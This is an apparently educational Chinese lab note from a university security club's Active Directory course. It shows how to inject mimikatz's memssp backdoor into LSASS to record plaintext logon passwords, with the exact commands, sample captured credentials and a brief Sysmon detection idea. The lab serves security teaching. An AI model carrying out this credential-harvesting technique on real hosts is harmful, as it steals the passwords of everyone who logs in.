---
title: NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)
tags: [information security, NTUSTISC, AD]

category: "Security｜Course｜NTUST ISC｜AD｜3. 更多密碼"
date: 2024-01-31
---

# NTUSTISC - AD Note - Lab(無法Reboot的時盜取Passwd)
<!-- more -->
[TOC]

Lecture Video: [2022/05/04 AD 安全1](https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&t=4257)

## Background
如果遇到不能重開機的狀況，要怎麼前面提到的明文密碼呢?可以利用MEMSSP，它也是mimikatz設計的一個小後門，只要提升debug權限，再注入這個後門，之後等其他人登入到此主機，就可以被這個後門記錄起來

## Lab

### ==無法Reboot的時盜取Passwd==
1. Inject memssp
    記得用系統管理員權限開mimikatz
    ```bash
    mimikatz # privilege::debug
    Privilege '20' OK

    mimikatz # misc::memssp
    Injected =)
    ```
2. Relogin
重新登出再登入才會看到
3. Result
    在`C:\Windows\System32\mimilsa.log`
    ```bash
    [00000000:001f7c0f] kuma\DESKTOP-G95U93T$	maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
    [00000000:001f7c0f] kuma\DESKTOP-G95U93T$	maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
    [00000000:001f80d1] kuma\DESKTOP-G95U93T$	maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
    [00000000:001f80d1] kuma\DESKTOP-G95U93T$	maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
    [00000000:001f80e8] kuma\DESKTOP-G95U93T$	maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
    [00000000:001f80e8] kuma\DESKTOP-G95U93T$	maj"2g<h(&iQZ7kqFHQ4X&c;_wQq3V;*gq.(A=4&)\2eesNp8S=W)C,"nM:ns?6m.%;K4+CSGDFew>VaNQ;N_)?mB1\P9udE7Gs'Lsr ccxo*CyL=JdK"'kF
    [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc
    [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc
    [00000000:001fc85a] kuma\bear	1qaz@WSX3edc
    [00000000:001fc85a] kuma\bear	1qaz@WSX3edc
    [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc
    [00000000:001fc7f9] kuma\bear	1qaz@WSX3edc
    ```
    可以看到這個log file用明文的方式新增了我們剛剛打入的密碼

### ==How to detect it?==
一樣是用Sysmon的Event ID: 11可以知道，但因為之前安裝不成功所以只能Skip，不過原理就是他是去偵測lsass.exe建立mimilsa.log的瞬間